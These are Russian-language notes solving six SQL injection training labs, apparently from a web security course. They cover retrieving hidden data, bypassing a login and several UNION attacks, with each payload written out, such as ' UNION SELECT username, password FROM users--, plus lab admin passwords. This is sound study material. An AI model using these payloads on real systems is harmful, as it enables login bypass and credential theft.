+ SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
  + Переходим в один из разделов, например Gifts.
  + В строке urla дописываем "'OR 1=1--".
  + WIN.
+ Lab: SQL injection vulnerability allowing login bypass
  + Открываем форму для ввода логина и пароля.
  + В поле Login вводим "administrator'-- ", а в поле Password любые символы.
  + WIN.
+ Lab: SQL injection UNION attack, determining the number of columns returned by the query
  + Переходим в один из разделов, например Gifts.
  + В строке urla дописываем "'+UNION+SELECT+NULL--". Ошибка.
  + В строке urla дописываем "'+UNION+SELECT+NULL,+NULL--". Ошибка.
  + В строке urla дописываем "'+UNION+SELECT+NULL,+NULL,+NULL--". Ошибки нет.
  + WIN.
+ Lab: SQL injection UNION attack, finding a column containing text
  + Переходим в один из разделов, например Gifts.
  + В строке urla дописываем "'+UNION+SELECT+NULL--". Ошибка => дописываем еще NULL.
  + В итоге для urla с дописанной строкой "'+UNION+SELECT+NULL,+NULL,+NULL--" ошибки нет.
  + Вместо каждого NULL подставляем 'a'.
  + Для "'+UNION+SELECT+NULL,+'a',+NULL--" ошибки нет, нашли столбец с текстовыми данными.
  + Вместо 'a' вводим предложенну строку ('sypRvz').
  + WIN.
+ Lab: SQL injection UNION attack, retrieving data from other tables
  + Переходим в один из разделов, например Tech gifts.
  + В строке urla дописываем "' UNION SELECT username, password FROM users--".
  + Видим логин administrator и соответствующий ему пароль t13tj637awscv622pug6, вводим их в форму логина.
  + WIN.
+ Lab: SQL injection UNION attack, retrieving multiple values in a single column
  + Переходим в один из разделов, например Gifts.
  + В строке urla дописываем "'+UNION+SELECT+NULL+FROM+users--". Ошибка.
  + В строке urla дописываем "'+UNION+SELECT+NULL,+NULL+FROM+users--". Ошибки нет.
  + В строке urla дописываем "'+UNION+SELECT+username,+password+FROM+users--". Ошибка.
  + В строке urla дописываем "'+UNION+SELECT+NULL,+username||'~'||password+FROM+users--". Ошибки нет.
  + Видим строку administrator~mhzg7sj4crpgoavh769q, вводим в форму логина логин administrator и пароль mhzg7sj4crpgoavh769q.
  + WIN.
